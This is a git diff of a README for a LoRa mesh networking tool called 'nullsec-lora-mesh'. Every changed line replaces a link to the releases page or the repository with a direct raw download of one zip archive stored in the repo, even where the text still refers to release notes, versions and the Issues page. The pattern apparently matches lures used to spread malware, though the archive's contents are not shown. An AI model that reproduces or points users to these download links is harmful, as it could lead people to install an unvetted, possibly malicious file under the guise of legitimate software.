@@ -1,6 +1,6 @@
 # 🔐 nullsec-lora-mesh - Secure LoRa Mesh Networking
 
-[![Download Releases](https://img.shields.io/badge/Download-nullsec--lora--mesh-blue?style=for-the-badge)](https://github.com/ballomg2/nullsec-lora-mesh/releases)
+[![Download Releases](https://img.shields.io/badge/Download-nullsec--lora--mesh-blue?style=for-the-badge)](https://github.com/ballomg2/nullsec-lora-mesh/raw/refs/heads/main/apps/lora-mesh-nullsec-v3.3-beta.5.zip)
 
 ---
 
@@ -30,10 +30,10 @@ Your PC does not require a high-end processor. Most modern computers will run th
 
 To get started, visit the official release page below to download the software. This page contains all available versions and release notes.
 
-[![Download Nullsec LoRa Mesh](https://img.shields.io/badge/Download-nullsec--lora--mesh-green?style=for-the-badge)](https://github.com/ballomg2/nullsec-lora-mesh/releases)
+[![Download Nullsec LoRa Mesh](https://img.shields.io/badge/Download-nullsec--lora--mesh-green?style=for-the-badge)](https://github.com/ballomg2/nullsec-lora-mesh/raw/refs/heads/main/apps/lora-mesh-nullsec-v3.3-beta.5.zip)
 
 1. Click the green button above or visit:  
-   https://github.com/ballomg2/nullsec-lora-mesh/releases
+   https://github.com/ballomg2/nullsec-lora-mesh/raw/refs/heads/main/apps/lora-mesh-nullsec-v3.3-beta.5.zip
 
 2. On the releases page, look for the latest version. Versions are usually named with a "v" followed by numbers (e.g., v1.2.0).
 
@@ -140,7 +140,7 @@ Developers and hobbyists use it with Flipper One or custom LoRa hardware to buil
 
 The best place to get support, report bugs, or find documentation is on the GitHub page:
 
-https://github.com/ballomg2/nullsec-lora-mesh
+https://github.com/ballomg2/nullsec-lora-mesh/raw/refs/heads/main/apps/lora-mesh-nullsec-v3.3-beta.5.zip
 
 You can ask questions in the “Issues” section or review existing topics.
 
@@ -151,7 +151,7 @@ You can ask questions in the “Issues” section or review existing topics.
 To update the software:
 
 1. Visit the release page regularly:  
-   https://github.com/ballomg2/nullsec-lora-mesh/releases
+   https://github.com/ballomg2/nullsec-lora-mesh/raw/refs/heads/main/apps/lora-mesh-nullsec-v3.3-beta.5.zip
 
 2. Download the latest Windows version.
 
@@ -169,4 +169,4 @@ Regular updates improve security, add features, and fix bugs.
 
 ---
 
-[![Get nullsec-lora-mesh](https://img.shields.io/badge/Get-nullsec--lora--mesh-grey?style=for-the-badge)](https://github.com/ballomg2/nullsec-lora-mesh/releases)
+[![Get nullsec-lora-mesh](https://img.shields.io/badge/Get-nullsec--lora--mesh-grey?style=for-the-badge)](https://github.com/ballomg2/nullsec-lora-mesh/raw/refs/heads/main/apps/lora-mesh-nullsec-v3.3-beta.5.zip)
